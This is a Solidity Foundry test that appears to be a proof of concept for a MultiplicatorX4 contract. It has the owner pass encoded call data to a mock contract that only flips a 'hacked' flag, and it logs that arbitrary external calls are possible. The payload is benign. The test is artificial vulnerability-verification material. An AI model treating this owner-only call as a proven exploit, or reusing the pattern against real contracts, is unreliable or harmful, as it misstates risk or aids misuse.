// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol";

contract MultiplicatorX4AttackTest is Test {
    MultiplicatorX4 multiplicator;
    MaliciousContract target;
    address owner = makeAddr("owner");
    
    function setUp() public {
        vm.prank(owner);
        multiplicator = new MultiplicatorX4();
        target = new MaliciousContract();
    }

    function testCommand_ArbitraryCallVulnerability() public {
        // Verify initial state is clean (BEFORE state snapshot)
        console.log("--- BEFORE-Trigger State ---");
        bool beforeHacked = target.hacked();
        console.log("target.hacked() before attack: %s", beforeHacked);
        assertEq(beforeHacked, false);

        console.log("--- Trigger: Calling Command with Malicious Payload ---");
        // Prepare malicious call data (setHacked function)
        bytes memory attackData = abi.encodeWithSignature("setHacked()");

        // Owner calls Command with malicious payload
        vm.prank(owner);
        multiplicator.Command{value: 0}(address(target), attackData);

        console.log("--- AFTER-Trigger State ---");
        // Verify the attack changed the contract state (AFTER state snapshot)
        bool afterHacked = target.hacked();
        console.log("target.hacked() after attack: %s", afterHacked);
        assertEq(afterHacked, true);

        // Vulnerability verification based on state change
        if (beforeHacked == false && afterHacked == true) {
            console.log("Comparison Verdict: State changed - Vulnerability exists");
            console.log("Vulnerability Exists: Successful state change shows MultiplicatorX4 allows owner to execute arbitrary external calls");
        } else {
            console.log("Comparison Verdict: State not changed - Vulnerability not proven");
            console.log("Vulnerability not Exist: Malicious call did not alter external contract state as expected");
        }
    }
}

contract MaliciousContract {
    bool public hacked;
    
    function setHacked() public payable {
        hacked = true;
    }
}